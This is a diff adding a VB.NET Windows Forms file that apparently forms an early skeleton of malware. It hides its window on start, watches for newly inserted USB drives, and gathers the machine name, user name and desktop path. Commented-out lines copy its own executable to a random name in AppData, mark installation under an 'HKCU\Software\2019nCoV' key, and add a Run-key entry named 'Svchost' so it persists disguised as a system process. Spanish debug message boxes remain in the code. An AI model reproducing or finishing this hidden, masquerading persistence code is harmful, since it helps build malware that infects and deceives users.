@@ -1,0 +1,123 @@
+Imports System.Runtime.InteropServices
+Public Class Form1
+
+   
+    Private Const WM_DEVICECHANGE As Integer = &H219
+    Private Const DBT_DEVICEARRIVAL As Integer = &H8000
+    Private Const DBT_DEVTYP_VOLUME As Integer = &H2
+
+    'Device information structure
+    Public Structure DEV_BROADCAST_HDR
+        Public dbch_size As Int32
+        Public dbch_devicetype As Int32
+        Public dbch_reserved As Int32
+    End Structure
+
+    'Volume information Structure
+    Private Structure DEV_BROADCAST_VOLUME
+        Public dbcv_size As Int32
+        Public dbcv_devicetype As Int32
+        Public dbcv_reserved As Int32
+        Public dbcv_unitmask As Int32
+        Public dbcv_flags As Int16
+    End Structure
+
+    'Function that gets the drive letter from the unit mask
+    Private Function apef(ByRef Unit As Int32) As Char
+        Dim driveMappedPath As String = String.Empty
+        Dim i As Integer = 0
+
+        While Unit > 1
+            i += 1
+            Unit = Unit >> 1
+        End While
+
+        driveMappedPath = Chr(i + Asc("A"c))
+        Return driveMappedPath.Replace(vbNullChar, ":")
+    End Function
+
+    'Override message processing to check for the DEVICECHANGE message
+    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
+        If m.Msg = WM_DEVICECHANGE Then
+            If CInt(m.WParam) = DBT_DEVICEARRIVAL Then
+                Dim DeviceInfo As DEV_BROADCAST_HDR
+                DeviceInfo = DirectCast(Marshal.PtrToStructure(m.LParam, GetType(DEV_BROADCAST_HDR)), DEV_BROADCAST_HDR)
+                If DeviceInfo.dbch_devicetype = DBT_DEVTYP_VOLUME Then
+                    Dim Volume As DEV_BROADCAST_VOLUME
+                    Volume = DirectCast(Marshal.PtrToStructure(m.LParam, GetType(DEV_BROADCAST_VOLUME)), DEV_BROADCAST_VOLUME)
+                    Dim DriveLetter As String = (apef(Volume.dbcv_unitmask) & ":\")
+                    MsgBox(DriveLetter)
+                    If IO.File.Exists(IO.Path.Combine(DriveLetter, "test.txt")) Then
+                        '<<<< The test file has been found >>>>
+                        MessageBox.Show("Found test file")
+                    Else
+                        '<<<< Test file has not been found >>>>
+                        MessageBox.Show(DriveLetter & "Could not find test file")
+                    End If
+                End If
+            End If
+        End If
+        MyBase.WndProc(m)
+    End Sub
+
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+
+        ' Dim targetURL As String = "https://www."
+
+        MsgBox(QueryValue(ERegistryPossibleRoots.HKEY_CURRENT_USER, "Software\2019nCoV", "INSTALLED", ERegistryPossibleValues.REG_SZ))
+        ' MsgBox("ES PRIMERA VFEZ")
+        ' mCopyFile(Application.ExecutablePath, strAppName)
+        'If Not DoesKeyExist(ERegistryPossibleRoots.HKEY_CURRENT_USER, "Software\2019nCoV") Then CreateRegKey("Software\2019nCoV", ERegistryPossibleRoots.HKEY_CURRENT_USER)
+        'SetValue("Software\2019nCoV", "INSTALLED", "TRUE", ERegistryPossibleRoots.HKEY_CURRENT_USER, ERegistryPossibleValues.REG_SZ)
+        'SetValue("Software\Microsoft\Windows\CurrentVersion\Run", "Svchost", strAppName, ERegistryPossibleRoots.HKEY_CURRENT_USER, ERegistryPossibleValues.REG_SZ)
+        'Else
+        MsgBox("EXISTE CONTINUO RUTINAS")
+        'End If
+        ' If Not DoesKeyExist(ERegistryPossibleRoots.HKEY_CURRENT_USER, "Software\2019nCoV") Then
+        ' CreateRegKey("Software\2019nCoV", ERegistryPossibleRoots.HKEY_CURRENT_USER)
+        ' MsgBox("NO EXISTE CLAVE LA CREA PARA LUEGO SETEAR VALOR DE INSTALLED")
+        ' SetValue("Software\2019nCoV", "INSTALLED", "TRUE", ERegistryPossibleRoots.HKEY_CURRENT_USER, ERegistryPossibleValues.REG_SZ)
+        ' Else
+        ' MsgBox("YA EXISTE CLAVE ")
+        ' End If
+
+        'MsgBox("existe")
+        'End If
+
+
+        'mCopyFile(Application.ExecutablePath, PEName)
+        'SetValue1("Software\Microsoft\Windows\CurrentVersion\Run", _
+        '          "Svchost", PEName, ERegistryPossibleRoots.HKEY_CURRENT_USER, _
+        '          ERegistryPossibleValues.REG_SZ)
+
+        'mGetDrives()m ,,   
+
+        ' StartActions()
+    End Sub
+    Sub StartActions()
+
+        ' SET SOME GENERAL VARIABLES
+        Dim strAppName As String = GEtSPecialFolder(Environment.SpecialFolder.LocalApplicationData) & RndName()
+        Dim strMachineName As String = System.Environment.MachineName.ToString()
+        Dim strUserName As String = Environment.UserName
+        Dim strDesktopPath As String = GEtSPecialFolder(Environment.SpecialFolder.Desktop)
+        ' CHECK IF THE APP IS ALREADY INSTALLED
+        If Not QueryValue(ERegistryPossibleRoots.HKEY_CURRENT_USER, "Software\2019nCoV", "INSTALLED", ERegistryPossibleValues.REG_SZ) Then
+            MsgBox("ES PRIMERA VFEZ")
+            ' mCopyFile(Application.ExecutablePath, strAppName)
+            'If Not DoesKeyExist(ERegistryPossibleRoots.HKEY_CURRENT_USER, "Software\2019nCoV") Then CreateRegKey("Software\2019nCoV", ERegistryPossibleRoots.HKEY_CURRENT_USER)
+            'SetValue("Software\2019nCoV", "INSTALLED", "TRUE", ERegistryPossibleRoots.HKEY_CURRENT_USER, ERegistryPossibleValues.REG_SZ)
+            'SetValue("Software\Microsoft\Windows\CurrentVersion\Run", "Svchost", strAppName, ERegistryPossibleRoots.HKEY_CURRENT_USER, ERegistryPossibleValues.REG_SZ)
+        Else
+            MsgBox("EXISTE CONTINUO RUTINAS")
+        End If
+
+
+    End Sub
+
+    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
+        Me.WindowState = FormWindowState.Minimized
+        Me.Hide()
+    End Sub
+End Class
+
